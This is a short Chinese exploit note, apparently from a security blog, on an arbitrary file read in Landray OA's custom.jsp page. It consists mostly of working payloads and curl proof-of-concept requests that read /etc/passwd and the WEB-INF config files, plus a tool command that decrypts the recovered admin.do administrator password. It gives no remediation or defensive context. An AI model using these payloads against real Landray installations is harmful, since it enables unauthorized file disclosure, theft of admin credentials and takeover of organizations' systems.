---
title: Landray-OA 蓝凌OA custom.jsp页面任意文件读取
encrypt: false
enc_pwd: askding
categories:
  - Kali
  - Exploit
date: 2021-05-13 19:40:49
top:
tags:
layout:
---
编写进度
- [x] 

# 蓝凌OA custom.jsp页面任意文件读取

- URI: `/sys/ui/extend/varkind/custom.jsp`
- payload: 
```zsh
var={"body":{"file":"file:///etc/passwd"}}
var={"body":{"file":"/WEB-INF/KmssConfig/kmssconfig.properties"}}
var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}
``` 

## POC
1. 查看kmssconfig配置文件
```zsh 
curl -X POST "http://ekpoa.example.com:8088/sys/ui/extend/varkind/custom.jsp" -d 'var={"body":{"file":"/WEB-INF/KmssConfig/kmssconfig.properties"}}'
```

![Landray-OA](https://raw.githubusercontent.com/askDing/PicGo/main/images/20210513194553landray-oa.png)

2. 查看`/admin.do`管理员后台密码
```zsh
curl -X POST "http://ekpoa.example.com:8088/sys/ui/extend/varkind/custom.jsp" -d 'var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}'
```

解密工具 [LandrayDES](https://github.com/zhutougg/LandrayDES)
```zsh 
java -jar LandrayDES-0.0.1-SNAPSHOT-jar-with-dependencies.jar Decrypt  admin.do S11E7bclfCnWEz/\JLVTdUw==
```

参考

[X凌OA任意文件读取](https://mp.weixin.qq.com/s?__biz=MzIyNjk0ODYxMA==&mid=2247485442&idx=1&sn=18175fcffeb5ccf31507a21f30145ddd&chksm=e869eb6fdf1e62793669c3e91b011034dfa7c11d0af173d9541be384e6606f64be0a93c1d5f5&xtrack=1&scene=90&subscene=93&sessionid=1620912773&clicktime=1620912781&enterid=1620912781&ascene=56&devicetype=android-30&version=28000339&nettype=WIFI&abtest_cookie=AAACAA%3D%3D&lang=en&exportkey=AUeLnswx%2BFALMw29vTEa4%2Bg%3D&pass_ticket=77Y82XyXpJKzg8bEukNk8K1Ac4jfOpASkJgWWfxkZ8QI4Er3daOMJ3T9fBFJHbz2&wx_header=1)
